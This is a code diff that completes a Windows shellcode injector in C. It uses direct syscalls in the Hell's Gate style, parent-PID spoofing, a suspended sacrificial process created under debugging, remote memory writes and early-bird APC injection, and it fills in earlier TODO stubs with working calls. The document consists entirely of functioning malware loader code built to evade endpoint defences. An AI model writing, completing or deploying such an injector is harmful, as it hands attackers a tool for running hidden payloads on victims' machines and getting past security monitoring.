@@ -87,7 +87,7 @@ BOOL GetRemoteProcessHandle(IN LPCWSTR pwstrProcName, IN DWORD* pdwPid, IN HANDL
 	// Calling NtQuerySystemInformation with the correct arguments, the output will be saved to 'SystemProcInfo'
 	WhisperHell(g_SyscallsTable.NtQuerySystemInformation.wSystemCall);
 	if ((status = NtQuerySystemInformation(SystemProcessInformation, SystemProcInfo, uReturnLen1, &uReturnLen2) != 0x0)) {
-		PRINTA("[!] HellDescent Failed With Error :  0x%0.8X\n", status);
+		PRINTA("[!] NtQuerySystemInformation Failed With Error :  0x%0.8X\n", status);
 		return FALSE;
 	}
 	PRINTA("[+] Retrieved SystemProcInfo Structure At %p with Actual Retrieved Size: %d\n", SystemProcInfo, uReturnLen2);
@@ -114,7 +114,7 @@ BOOL GetRemoteProcessHandle(IN LPCWSTR pwstrProcName, IN DWORD* pdwPid, IN HANDL
 			if (hProcess) {
 				if (!IsProcessElevated(hProcess)) {  // Check if process is non-elevated
 					*pdwPid = (DWORD)SystemProcInfo->UniqueProcessId;
-					*phProcess = hProcess;
+					*phProcess = g_Api.pOpenProcess(PROCESS_ALL_ACCESS, FALSE, (DWORD)SystemProcInfo->UniqueProcessId);
 					break;
 				}
 				CloseHandle(hProcess); // Close handle if elevated
@@ -294,6 +294,8 @@ BOOL CreatePPidSpoofedAndSuspendedProcess(IN HANDLE hParentProcess, IN LPCSTR lp
 
 	wsprintfA(lpPath, "%s\\System32\\%s", WnDr, lpProcessName);
 
+	PRINTA("[i] Creating Process With Path : %s \n", lpPath);
+
 	// This will fail with ERROR_INSUFFICIENT_BUFFER, as expected
 	InitializeProcThreadAttributeList(
 		NULL,
@@ -320,7 +322,8 @@ BOOL CreatePPidSpoofedAndSuspendedProcess(IN HANDLE hParentProcess, IN LPCSTR lp
 
 	if (!UpdateProcThreadAttribute(
 		pThreadAttList,
-		NULL, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS,
+		NULL,
+		PROC_THREAD_ATTRIBUTE_PARENT_PROCESS,
 		&hParentProcess,
 		sizeof(HANDLE),
 		NULL,
@@ -342,7 +345,7 @@ BOOL CreatePPidSpoofedAndSuspendedProcess(IN HANDLE hParentProcess, IN LPCSTR lp
 		EXTENDED_STARTUPINFO_PRESENT | DEBUG_PROCESS,
 		NULL,
 		NULL,
-		&SiEx.StartupInfo,
+		&SiEx,
 		&Pi)) {
 		PRINTA("[!] CreateProcessA Failed with Error : %d \n", GetLastError());
 		return FALSE;
@@ -354,7 +357,6 @@ BOOL CreatePPidSpoofedAndSuspendedProcess(IN HANDLE hParentProcess, IN LPCSTR lp
 
 	// Cleaning up
 	DeleteProcThreadAttributeList(pThreadAttList);
-	CloseHandle(hParentProcess);
 
 	if (*dwProcessId != NULL && *hProcess != NULL && *hThread != NULL)
 		return TRUE;
@@ -365,12 +367,9 @@ BOOL CreatePPidSpoofedAndSuspendedProcess(IN HANDLE hParentProcess, IN LPCSTR lp
 // TODO: use syscalls or API hashing
 BOOL InjectShellcodeToRemoteProcess(HANDLE hProcess, PBYTE pShellcode, SIZE_T sSizeOfShellcode, OUT PVOID* ppInjectedShellcodeAddress)
 {
-
 	PVOID	pShellcodeAddress = NULL;
-
 	SIZE_T	sNumberOfBytesWritten = NULL;
 	DWORD	dwOldProtection = NULL;
-
 
 	// Allocate memory in the remote process of size sSizeOfShellcode 
 	pShellcodeAddress = VirtualAllocEx(hProcess, NULL, sSizeOfShellcode, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
@@ -411,42 +410,45 @@ BOOL RemoteEarlyBirdApcInjectionViaSyscalls(HANDLE hParentProcess, LPCSTR pstrSa
 	DWORD dwProcessId = 0;
 	PVOID pInjectedAddress = NULL;
 
-	// Create the sacrificial thread
-	if (!CreatePPidSpoofedAndSuspendedProcess(
-		hParentProcess,
-		pstrSacrificalProcessName,
-		&dwProcessId,
-		hProcess,
-		hThread)) {
+	// Create the sacrificial process
+	if (!CreatePPidSpoofedAndSuspendedProcess(hParentProcess, pstrSacrificalProcessName, &dwProcessId, &hProcess, &hThread)) {
 		PRINTA("[!] CreatePPidSpoofedAndSuspendedProcess Failed With Error : %d \n", GetLastError());
-		return FALSE;
+		return -1;
 	}
+	PRINTA("[+] Created Sacrificial Process: %s with PID: %d And Handle: %p!\n", pstrSacrificalProcessName, dwProcessId, hProcess);
 
-	// TODO: Inject the shellcode to the sacrificial process
+	PRINTA("Press <Enter> To Inject Shellcode ... ");
+	GETCHAR();
+
+	// Inject the shellcode to the sacrificial process
 	if (!InjectShellcodeToRemoteProcess(hProcess, pShellcodeAddress, sSizeOfShellcode, &pInjectedAddress)) {
 		PRINTA("[!] InjectShellcodeToRemoteProcess Failed With Error : %d \n", GetLastError());
-		return FALSE;
+		return -1;
 	}
+	PRINTA("[+] Shellcode Injected At : 0x%p \n", pInjectedAddress);
+	PRINTA("[i] Press <Enter> To Queue The APC ... ");
+	GETCHAR();
 
-	// TODO: Queue the APC
 	if (!QueueUserAPC((PAPCFUNC)pInjectedAddress, hThread, NULL)) {
 		PRINTA("[!] QueueUserAPC Failed With Error : %d \n", GetLastError());
 		return FALSE;
 	}
+	PRINTA("[+] APC Queued Successfully To Thread With TID : %d\n", GetThreadId(hThread));
 
-	// TODO: Detach the debugger
+	// Detach the debugger
 	if (!DebugActiveProcessStop(dwProcessId)) {
 		PRINTA("[!] DebugActiveProcessStop Failed With Error : %d \n", GetLastError());
 		return FALSE;
 	}
 
-	// TODO: Wait until the thread is finished
+	//Resume the thread in case we use the CREATE_SUSPENDED flag
+	//ResumeThread(hThread);
+
 	if (!WaitForSingleObject(hThread, INFINITE)) {
 		PRINTA("[!] WaitForSingleObject Failed With Error : %d \n", GetLastError());
 		return FALSE;
 	}
 
-	// TODO: Release the allocated memory
 	if (!VirtualFreeEx(hProcess, pInjectedAddress, 0, MEM_RELEASE)) {
 		PRINTA("[!] VirtualFreeEx Failed With Error : %d \n", GetLastError());
 		return FALSE;
